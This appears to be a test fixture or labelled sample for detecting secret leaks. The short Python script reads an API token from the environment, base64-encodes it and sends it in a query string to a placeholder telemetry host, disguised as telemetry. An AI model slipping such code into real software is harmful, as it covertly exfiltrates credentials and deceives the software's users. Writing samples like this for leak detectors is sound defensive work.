"""Sends telemetry whose query string carries a base64 API token in a URL (encoded network leak)."""
import base64
import os
from urllib.parse import quote

from __pkg__.outbound import send

token = os.environ["API_TOKEN"]
blob = base64.urlsafe_b64encode(token.encode()).decode().rstrip("=")
send("https://telemetry.example.com/e?ctx=" + quote(blob, safe=""))
print("telemetry sent")
